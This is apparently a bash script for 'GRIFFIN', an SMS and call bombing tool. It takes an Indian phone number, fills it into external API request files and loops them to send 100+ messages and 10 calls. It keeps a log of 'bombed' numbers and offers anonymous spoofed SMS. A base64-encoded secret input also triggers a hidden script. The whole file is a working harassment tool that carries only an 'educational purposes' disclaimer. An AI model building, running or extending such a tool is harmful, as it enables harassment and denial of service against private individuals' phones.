#!/bin/bash


RED="$(printf '\e[31m')"
GREEN="$(printf '\e[32m')"
ORANGE="$(printf '\e[33m')"
BLUE="$(printf '\e[34m')"
MAGENTA="$(printf '\e[35m')"
CYAN="$(printf '\e[36m')"
WHITE="$(printf '\e[37m')"
BLACK="$(printf '\e[30m')"

apt-get install -y git curl wget pv espeak

clear
just() {
clear
echo ""
echo ""
printf  "                      \e[1;33m|C|O|N|N|E|C|T|I|N|G|"
echo ""
echo ""
echo ""
}


banner() {


sleep 1
echo "                   $WHITE Author:$RED Arrey@n"
echo ""

}

#    Check Internet
wget -q --spider https://github.com/GriffinBlackbird

if [ $? -eq 0 ]; then
    just
else
    clear
    echo -e "\e[1;34m‎‎‏‏ ‎"
    banner
    sleep 1
    echo ""
    echo ""
    echo -e "\e[92m[\e[91m~\e[92m]\e[93m You are not connected to internet !\e[93m"
    echo ""
    echo -e "\e[92m[\e[91m~\e[92m]\e[93m Please connect and try again !!\e[93m"
    echo ""
    echo ""
    exit
fi

rm .server.txt > /dev/null 2>&1
wget -L https://raw.githubusercontent.com/anubhavanonymous/serverxlr8/main/.server.txt  > /dev/null 2>&1
serverup="On"
server=$(cat .server.txt | grep On)
if [[ $server = $serverup ]]
then
echo ""
else
clear
echo ""
sleep 1
echo "              $BLUE ╭━━━┳━━━┳━━━┳━━━┳━━━╮ ╭╮╱╭┳━━━┳╮╱╭╮"
echo "              $CYAN ┃╭━━┫╭━╮┃╭━╮┃╭━╮┃╭━╮┃ ┃┃╱┃┃╭━╮┃┃╱┃┃"
echo "              $BLUE ┃╰━━┫╰━╯┃╰━╯┃┃╱┃┃╰━╯┃ ┃╰━╯┃┃┃┃┃╰━╯┃"
echo "              $CYAN ┃╭━━┫╭╮╭┫╭╮╭┫┃╱┃┃╭╮╭╯ ╰━━╮┃┃┃┃┣━━╮┃"
echo "              $BLUE ┃╰━━┫┃┃╰┫┃┃╰┫╰━╯┃┃┃╰╮ ╱╱╱┃┃╰━╯┃╱╱┃┃"
echo "              $CYAN ╰━━━┻╯╰━┻╯╰━┻━━━┻╯╰━╯ ╱╱╱╰┻━━━╯╱╱╰╯"
echo ""
echo ""
sleep 2
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[0m Sorry for the inconvenience :(" | pv -qL 30
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[36m The Server is under maintenance !!" | pv -qL 20
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[0m Contact the developer !" | pv -qL 30
echo ""
exit
exit
exit
fi




bombrecord() {
clear

echo -e "     \e[92m[\e[36m~\e[92m]\e[93m This is a record of numbers which had been bombed!\e[93m" | pv -qL 30
echo " $GREEN"
cat .bombrecord.txt
exit
}

PW_WD=$(pwd)
cd model
cp headapis $PW_WD
cp tailapis $PW_WD
cp anonapi $PW_WD
cd ..

SECRET=VmtjMWQyTnJNSGROVlZab1pXdGFUMVZyV2tkT2JGSjFXa2hhVVZWWE9EbERaejA5Q2c9PQo=
for i in {1..5}
do SECRET=$(echo $SECRET | base64 --decode)
done




eexec() {
echo "Under construction"
exit
}

menu() {
clear

echo ""
printf "             \e[1;92m[\e[0m GRIFFIN\e[1;92m ]\e[0m \e[1;93mEnter target  >>> \e[0m"
read targett
if [[ $targett = $SECRET ]]
then
bash .notyourbusiness.sh
else
printf "\n"
echo ""
Date=$(date)
echo -e "      $targett was bombed on $Date"  >> .bombrecord.txt

printf "             ~~~\e[1;92m Attack Started On +91$targett \e[0m~~~"
sleep 1
echo ""
echo ""
printf "\n"
printf "   Press ctrl+c to quit ! \n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93mIt will automatically stop in 5 mins\e[93m"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Will send 100+ msgs and 10 calls\e[93m"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Please don't share this file it has my name in it.\e[93m"
echo ""

while read a; do
    echo ${a//€shushhi/$targett}
done < headapis > headapis.t
mv headapis{.t,}

while read a; do
    echo ${a//€shushhi/$targett}
done < tailapis > tailapis.t
mv tailapis{.t,}

for i in {1..4}
do bash headapis
done

for i in {1..27}
do bash tailapis
done

exit 
fi
}


anonmsg(){
clear
echo ""

echo "     $RED ▄▀█ █▄░█ █▀█ █▄░█ █▄█ █▀▄▀█ █▀█ █░█ █▀   █▀▄▀█ █▀ █▀▀"
echo "     $WHITE █▀█ █░▀█ █▄█ █░▀█ ░█░ █░▀░█ █▄█ █▄█ ▄█   █░▀░█ ▄█ █▄█"
echo ""
echo ""
printf "      \e[1;92m[\e[0m GRIFFIN\e[1;92m ]\e[0m \e[1;93mEnter target  >>> \e[0m"
read smstarget
echo ""
printf "      \e[1;92m[\e[0m GRIFFIN\e[1;92m ]\e[0m \e[1;93mEnter Your Message  >>> \e[0m"
read text
echo ""

while read a; do
    echo ${a//₹axx/$smstarget}
done < anonapi > anonapi.t
mv anonapi{.t,}
while read a; do
    echo ${a//€amsg/$text}
done < anonapi > anonapi.t
mv anonapi{.t,}
bash anonapi > records.txt
value=$( grep -o "true" records.txt)
if [[ $value = "true" ]]
then
echo ""
printf "   \e[92m[\e[91m~\e[92m] \e[0m\e[44mSuccess !!\e[0m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Please be pateint, Msgs take some time to get delivered !!\e[93m"
echo ""
exit
else
echo ""
printf "   \e[92m[\e[91m~\e[92m] \e[0m\e[44mError 404 ! $RED(╥﹏╥)\e[0m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m This feature doesn't works sometimes !!\e[93m"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Remember you can only send one msg per day !\e[93m"
echo ""
exit
fi
}


menux() {
clear
clear
banner
sleep 1
DATE=$(date)
echo "$WHITE Started on $RED$DATE"
echo "$WHITE------------------------------"
printf "\e[1;33m⚡This tool is only for Educational Purposes!\e[0m\n"
echo "------------------------------"
echo ""
sleep 1
printf "\e[1;92m[\e[0m 1\e[1;92m ]\e[0m>>>\e[1;33m MASS BOMBING \e[0m\n"
printf "\e[1;92m[\e[0m 5\e[1;92m ]\e[0m>>>\e[1;33m QUIT \e[0m\n"
echo ""
printf "\e[1;31m Select Option\e[0m−>>"
read options
if [ "$options" -eq "0" ];then
        bombrecord
fi
if [ "$options" -eq "1" ];then
        menu
fi
if [ "$options" -eq "2" ];then
        anonmsg
fi
if [ "$options" -eq "3" ];then
        updatee
fi
if [ "$options" -eq "4" ];then
        about
fi
if [ "$options" -eq "007" ];then
        eexec
fi
if [ "$options" -eq "5" ];then
        echo ""
        echo -e "\e[92m[\e[91m~\e[92m]\e[93m Thanks for Using GRIFFIN !\e[93m"
        echo ""
        exit
else
        menux
fi


}
menux
